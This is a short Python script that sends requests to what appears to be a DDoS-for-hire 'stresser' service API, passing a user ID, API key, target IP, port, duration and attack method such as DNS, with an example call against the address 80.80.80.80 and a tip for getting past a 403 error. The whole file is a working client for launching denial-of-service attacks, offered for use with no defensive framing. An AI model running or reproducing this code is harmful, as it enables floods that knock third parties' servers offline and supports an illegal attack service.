import requests

def send_attack(user, api_key, target, port, duration, method):
    url = "https://mao-stress.tech/api/start.php"
    params = {
        'user': user,
        'api_key': api_key,
        'target': target,
        'port': port,
        'duration': duration,
        'method': method
    }
    
    try:
        response = requests.get(url, params=params)
        if response.status_code == 200:
            print("Attack started successfully.")
            print("Response:", response.json())
        else:
            print("Failed to start attack.")
            print("Status Code:", response.status_code)
            print("Response:", response.text)
    except Exception as e:
        print("An error occurred:", e)

# Example usage (If you get "Status Code" 403, add your IP address to the “CF IP Whitelist” field when creating an API):
user_id = 2
api_key = "yourapikey"
target = "80.80.80.80"
port = 80
duration = 15
method = "DNS"

send_attack(user_id, api_key, target, port, duration, method)
